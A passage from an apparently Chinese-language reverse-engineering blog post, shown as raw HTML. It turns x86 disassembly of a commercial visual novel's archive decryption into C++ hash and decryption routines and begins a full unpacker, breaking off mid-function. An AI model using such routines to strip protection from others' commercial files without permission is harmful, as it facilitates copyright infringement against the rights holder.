class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">004ED02B         | 59              | pop ecx                                            |</span><br><span class="line">004ED02C         | 8B45 08         | mov eax,dword ptr ss:[ebp+0x8]                     |</span><br><span class="line">004ED02F         | 8B40 FC         | mov eax,dword ptr ds:[eax-0x4]                     | [eax-4]:L&quot;甄Cа&quot;</span><br><span class="line">004ED032         | C1E8 03         | shr eax,0x3                                        | eax=数据大小&gt;&gt;3</span><br><span class="line">004ED035         | 8945 FC         | mov dword ptr ss:[ebp-0x4],eax                     |</span><br><span class="line">004ED038         | 837D FC 00      | cmp dword ptr ss:[ebp-0x4],0x0                     | 数据大小 &gt;&gt; 3 等于0就结束</span><br><span class="line">004ED03C         | 74 73           | je 月に寄りそう乙女の作法22.4ED0B1                            |</span><br><span class="line">004ED03E         | 8B45 08         | mov eax,dword ptr ss:[ebp+0x8]                     |</span><br><span class="line">004ED041         | 8B40 F8         | mov eax,dword ptr ds:[eax-0x8]                     |</span><br><span class="line">004ED044         | 8945 F4         | mov dword ptr ss:[ebp-0xC],eax                     |</span><br><span class="line">004ED047         | 8D85 F0FEFFFF   | lea eax,dword ptr ss:[ebp-0x110]                   | eax = 刚刚算出hash的指针</span><br><span class="line">004ED04D         | 8945 F0         | mov dword ptr ss:[ebp-0x10],eax                    |</span><br><span class="line">004ED050         | 8B85 24FFFFFF   | mov eax,dword ptr ss:[ebp-0xDC]                    | 相当于取了算出的hash指针+0x34的DWORD key1</span><br><span class="line">004ED056         | 83E0 0F         | and eax,0xF                                        |</span><br><span class="line">004ED059         | 03C0            | add eax,eax                                        |</span><br><span class="line">004ED05B         | 03C0            | add eax,eax                                        |</span><br><span class="line">004ED05D         | 03C0            | add eax,eax                                        | key1 = (val &amp; 0xF) &lt;&lt; 3</span><br><span class="line">004ED05F         | 8945 F8         | mov dword ptr ss:[ebp-0x8],eax                     |</span><br><span class="line">004ED062         | 50              | push eax                                           |</span><br><span class="line">004ED063         | 53              | push ebx                                           |</span><br><span class="line">004ED064         | 51              | push ecx                                           |</span><br><span class="line">004ED065         | 52              | push edx                                           | edx:&quot;l;p&quot;</span><br><span class="line">004ED066         | 56              | push esi                                           |</span><br><span class="line">004ED067         | 57              | push edi                                           | edi:&quot;0yC&quot;</span><br><span class="line">004ED068         | 8B4D FC         | mov ecx,dword ptr ss:[ebp-0x4]                     | ecx=数据大小&gt;&gt;3</span><br><span class="line">004ED06B         | 8B55 F8         | mov edx,dword ptr ss:[ebp-0x8]                     | edx = key1</span><br><span class="line">004ED06E         | 8B7D F4         | mov edi,dword ptr ss:[ebp-0xC]                     | edi指向了要解密的数据</span><br><span class="line">004ED071         | 8B75 F0         | mov esi,dword ptr ss:[ebp-0x10]                    | esi指向之前算出的hash</span><br><span class="line">004ED074         | 0F6F7E 18       | movq mm7,qword ptr ds:[esi+0x18]                   | mm7 = *(QWORD*)(hash+0x18)</span><br><span class="line">004ED078         | 8D0432          | lea eax,dword ptr ds:[edx+esi]                     |</span><br><span class="line">004ED07B         | 0F6F30          | movq mm6,qword ptr ds:[eax]                        | mm6 = *(QWORD*)(hash+key1)</span><br><span class="line">004ED07E         | 0FEFFE          | pxor mm7,mm6                                       | mm7 ^= mm6</span><br><span class="line">004ED081         | 0FFEFE          | paddd mm7,mm6                                      |</span><br><span class="line">004ED084         | 0F6F07          | movq mm0,qword ptr ds:[edi]                        | mm0 = data</span><br><span class="line">004ED087         | 0FEFC7          | pxor mm0,mm7                                       | mm0 ^= mm7</span><br><span class="line">004ED08A         | 0F6FC8          | movq mm1,mm0                                       | mm1 = mm0</span><br><span class="line">004ED08D         | 0F7F07          | movq qword ptr ds:[edi],mm0                        | 解密3写入数据</span><br><span class="line">004ED090         | 0FFCF9          | paddb mm7,mm1                                      |</span><br><span class="line">004ED093         | 0FEFF9          | pxor mm7,mm1                                       |</span><br><span class="line">004ED096         | 0F72F7 01       | pslld mm7,0x1                                      |</span><br><span class="line">004ED09A         | 0FFDF9          | paddw mm7,mm1                                      |</span><br><span class="line">004ED09D         | 83C7 08         | add edi,0x8                                        | edi:&quot;0yC&quot;</span><br><span class="line">004ED0A0         | 83C2 08         | add edx,0x8                                        | edx:&quot;l;p&quot;</span><br><span class="line">004ED0A3         | 83E2 7F         | and edx,0x7F                                       | key1 = (key1 + 8)&amp; 0x7F</span><br><span class="line">004ED0A6         | 49              | dec ecx                                            |</span><br><span class="line">004ED0A7         | 75 CF           | jne 月に寄りそう乙女の作法22.4ED078                           |</span><br></pre></td></tr></table></figure><p>写成c++</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dencrypt3</span><span class="params">(<span class="type">void</span>* data,<span class="type">int</span> len, <span class="type">void</span>* filekey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//0x34相当于4字节数据+0xD</span></span><br><span class="line">    DWORD key1 = (*((DWORD*)filekey + <span class="number">0xD</span>) &amp; <span class="number">0xF</span>) &lt;&lt; <span class="number">3</span>;</span><br><span class="line">    BYTE* datapos = (BYTE*)data, * fkey = (BYTE*)filekey;</span><br><span class="line">    __m64 mm7 = *((__m64*)filekey + <span class="number">0x3</span>); <span class="comment">//这里0x3相当于BYTE的0x18</span></span><br><span class="line">    __m64 mm6, mm0, mm1;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len &gt;&gt;<span class="number">3</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        mm6 = *(__m64*)(fkey + key1);</span><br><span class="line">        mm7 = _m_pxor(mm7, mm6);</span><br><span class="line">        mm7 = _m_paddd(mm7, mm6);</span><br><span class="line">        mm0 = *(__m64*)datapos;</span><br><span class="line">        mm0 = _m_pxor(mm0, mm7);</span><br><span class="line">        mm1 = mm0;</span><br><span class="line">        *(__m64*)datapos = mm0;</span><br><span class="line">        mm7 = _m_paddb(mm7, mm1);</span><br><span class="line">        mm7 = _m_pxor(mm7, mm1);</span><br><span class="line">        mm7 = _m_pslldi(mm7, <span class="number">0x1</span>);</span><br><span class="line">        mm7 = _m_paddw(mm7, mm1);</span><br><span class="line">        datapos += <span class="number">8</span>;</span><br><span class="line">        key1 = (key1 + <span class="number">8</span>) &amp; <span class="number">0x7F</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    _m_empty();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-37.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-38.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-39.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-40.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-41.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-42.png" alt="img"><br><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-43.png" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BYTE* <span class="title">dencypt4_keyfilehash</span><span class="params">(<span class="type">void</span>* data,<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span>* keyfilehash = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span>* keyfilehash_pos = keyfilehash;</span><br><span class="line">    <span class="comment">//keyhash初始数据的计算</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">3</span> ==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            *keyfilehash_pos = (i + <span class="number">3u</span>) * (i + <span class="number">7u</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            *keyfilehash_pos = -(i + <span class="number">3u</span>) * (i + <span class="number">7u</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        keyfilehash_pos++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> key1 = *(BYTE*)((BYTE*)data + <span class="number">0x31</span>);</span><br><span class="line">    key1 = (key1 % <span class="number">0x49</span>) + <span class="number">0x80</span>;</span><br><span class="line">    <span class="type">int</span> key2 = *(BYTE*)((BYTE*)data + <span class="number">0x1E</span> + <span class="number">0x31</span>);</span><br><span class="line">    key2 = (key2 % <span class="number">7</span>) + <span class="number">7</span>;</span><br><span class="line">    BYTE* keyfilehash_pos_byte = (BYTE*)keyfilehash;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        key1 = (key1 + key2) % len;</span><br><span class="line">        *keyfilehash_pos_byte ^= *(BYTE*)((BYTE*)data + key1);</span><br><span class="line">        keyfilehash_pos_byte++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (BYTE*)keyfilehash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/%E4%B8%87%E5%8D%8E%E9%95%9C%E9%80%86%E5%90%91(%E5%88%9D%E8%AF%95)/images/image-44.png" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">FilePackVer</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> sign[<span class="number">0x10</span>];</span><br><span class="line">    DWORD filecount;</span><br><span class="line">    <span class="type">int</span> entry_low;</span><br><span class="line">    <span class="type">int</span> entry_high;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">HashData</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> sign[<span class="number">0x20</span>];</span><br><span class="line">    DWORD HashVerSize;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x100</span>];</span><br><span class="line">    DWORD Unkown;</span><br><span class="line">    <span class="type">char</span> Blank[<span class="number">0x2F8</span>];</span><br><span class="line">    FilePackVer fpacker;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Dencrypt2DataHead</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD sign;</span><br><span class="line">    DWORD isWordType;</span><br><span class="line">    DWORD size;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Dencrypt2DataOutput</span></span><br><span class="line">&#123;</span><br><span class="line">    BYTE* data;</span><br><span class="line">    DWORD len;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">FileEntry</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD offset_low;</span><br><span class="line">    DWORD offset_hight;</span><br><span class="line">    DWORD size;</span><br><span class="line">    DWORD dencrypted_size;</span><br><span class="line">    DWORD isCompressed;</span><br><span class="line">    DWORD EncryptType; <span class="comment">// 0未加密 1第一种加密算法 2为第二种加密算法</span></span><br><span class="line">    DWORD hash;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">DWORD <span class="title">Tohash</span><span class="params">(<span class="type">void</span>* data, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//准备工作</span></span><br><span class="line">    __m64 mm0 = _mm_cvtsi32_si64(<span class="number">0</span>);</span><br><span class="line">    __m64 mm1;</span><br><span class="line">    __m64 mm2 = _mm_cvtsi32_si64(<span class="number">0</span>);</span><br><span class="line">    DWORD key = <span class="number">0xA35793A7</span>;</span><br><span class="line">    __m64 mm3 = _mm_cvtsi32_si64(key);</span><br><span class="line">     mm3 = _m_punpckldq(mm3, mm3);</span><br><span class="line">     __m64* pdata=(__m64*)data;</span><br><span class="line">    <span class="comment">//开始循环计算hash</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; (len &gt;&gt; <span class="number">3</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        mm1 = *pdata;</span><br><span class="line">        pdata++;</span><br><span class="line">        mm2 = _m_paddw(mm2, mm3);</span><br><span class="line">        mm1 = _m_pxor(mm1, mm2);</span><br><span class="line">        mm0 = _m_paddw(mm0, mm1);</span><br><span class="line">        mm1 = mm0;</span><br><span class="line">        mm0 = _m_pslldi(mm0, <span class="number">3</span>);</span><br><span class="line">        mm1 = _m_psrldi(mm1, <span class="number">0x1D</span>);</span><br><span class="line">        mm0 = _m_por(mm1, mm0);</span><br><span class="line">    &#125;</span><br><span class="line">    mm1 = _m_psrlqi(mm0, <span class="number">32</span>);</span><br><span class="line">    DWORD result = _mm_cvtsi64_si32(_m_pmaddwd(mm0, mm1));</span><br><span class="line">    _m_empty();<span class="comment">//复位浮点寄存器</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dencrypt</span><span class="params">(<span class="type">void</span>* data,<span class="type">unsigned</span> <span class="type">int</span> len, DWORD hash)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (len &gt;&gt; <span class="number">3</span> == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//准备工作</span></span><br><span class="line">    DWORD key1 = <span class="number">0xA73C5F9D</span>;</span><br><span class="line">    DWORD key2 = <span class="number">0xCE24F523</span>;</span><br><span class="line">    DWORD key3 = (len + hash)^ <span class="number">0xFEC9753E</span>;</span><br><span class="line">    __m64 mm7 = _mm_cvtsi32_si64(key1);</span><br><span class="line">    mm7 = _m_punpckldq(mm7, mm7);</span><br><span class="line">    __m64 mm6 = _mm_cvtsi32_si64(key2);</span><br><span class="line">    mm6 = _m_punpckldq(mm6, mm6);</span><br><span class="line">    __m64 mm5 = _mm_cvtsi32_si64(key3);</span><br><span class="line">    mm5 = _m_punpckldq(mm5, mm5);</span><br><span class="line">    __m64* datapos = (__m64*)data;</span><br><span class="line">    __m64 mm0;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len &gt;&gt; <span class="number">3</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        mm7 = _m_paddd(mm7, mm6);</span><br><span class="line">        mm7 = _m_pxor(mm7, mm5);</span><br><span class="line">        mm0 = *datapos;</span><br><span class="line">        mm0 = _m_pxor(mm0, mm7);</span><br><span class="line">        mm5 = mm0;</span><br><span class="line">        *datapos = mm0;</span><br><span class="line">        datapos++;</span><br><span class="line">    &#125;</span><br><span class="line">    _m_empty();<span class="comment">//复位浮点寄存器</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Dencrypt2DataOutput* <span class="title">dencrypt2</span><span class="params">(<span class="type">void</span>* data, <span class="type">unsigned</span> <span class="type">int</span> len,<span class="type">unsigned</span> <span class="type">int</span> dencrypted_len, DWORD hash)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> Sampletable[<span class="number">0x100</span>],table[<span class="number">0x100</span>],other[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Sampletable[i] = 